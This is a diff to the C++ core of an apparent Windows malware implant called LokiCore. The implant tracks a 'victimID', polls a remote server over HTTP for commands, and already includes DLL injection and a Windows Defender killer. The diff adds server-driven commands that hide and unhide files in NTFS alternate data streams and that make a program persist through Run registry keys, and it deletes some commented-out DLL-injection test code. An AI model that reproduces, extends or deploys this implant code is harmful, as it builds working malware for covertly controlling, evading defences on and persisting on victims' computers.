@@ -12,6 +12,9 @@
 #include "Utils.h"
 #include "DLLInjection.h"
 #include "WinDefKiller.h"
+#include "FileHiderADS.h"
+#include "Persistence.h"
+
 
 using namespace std;
 
@@ -23,6 +26,8 @@ class LokiCore{
 		ListProcesses = 2,
 		WinDefenderKiller = 3,
 		HideFile = 4,
+		UnhideFile = 5,
+		Persistence = 6,
 	};
 
 	public:
@@ -33,17 +38,6 @@ class LokiCore{
 			IPC ipc = IPC();	
 			ipc.storeStringADS(fakeID);
 			string victimID = ipc.readStringADS();
-
-
-
-			/*Utils utils = Utils();
-			int pid = utils.getPIDbyProcName("notepad.exe");
-
-			DLLInjector dllInjector = DLLInjector();
-			char dllPath[] = "C:\\Users\\b\\Desktop\\LokiServer\\LokiServer\\bin\\Debug\\net7.0\\System.Data.SqlClient.dll";
-			dllInjector.DLLinjector(pid, dllPath);*/
-
-
 
 			string lastAction = "-1";
             while (true) {
@@ -68,6 +62,7 @@ class LokiCore{
 				string dllPath = "";
 				int pid;
 				string processName;
+				string adsName;
 
 				switch (actionInt) {
 					
@@ -106,11 +101,44 @@ class LokiCore{
 						break;
 					
 					case HideFile:
-						// instructions for hiding file
+						params = http.httpGetParamsAction(victimID, action);
 
+						srcFile = params.substr(params.find("srcFile=") + 8, params.find(",") - 8);
+						dstFile = params.substr(params.find("dstFile=") + 8, params.find(",") - 8);
+						adsName = params.substr(params.find("adsName=") + 8, params.length() - 8);
+
+						FileHider fileHider = FileHider();
+						fileHider.hideFile(srcFile, dstFile, adsName);
 						break;
-				}
 
+					case UnhideFile:
+						params = http.httpGetParamsAction(victimID, action);
+
+						srcFile = params.substr(params.find("srcFile=") + 8, params.find(",") - 8);
+						dstFile = params.substr(params.find("dstFile=") + 8, params.find(",") - 8);
+						adsName = params.substr(params.find("adsName=") + 8, params.length() - 8);
+
+						FileHider fileHider2 = FileHider();
+						fileHider2.unHideFile(srcFile, dstFile, adsName);
+						break;
+
+					case Persistence:
+						params = http.httpGetParamsAction(victimID, action);
+						// exe=C:\Windows\System32\notepad.exe,name=notepad
+
+						string exe = params.substr(params.find("exe=") + 4, params.find(",") - 4);
+						string name = params.substr(params.find("name=") + 5, params.length() - 5);
+
+						
+
+						LPCWSTR nameLPCWSTR = utils.convertStringToLPCWSTR(name);
+
+						PersistenceClass persistence = PersistenceClass();
+						persistence.persistenceViaRunKeys(exe.c_str(), nameLPCWSTR);
+						
+						break;
+
+				}
                 OutputDebugStringA(result.c_str());
                 SleepImplant(5000);
             }
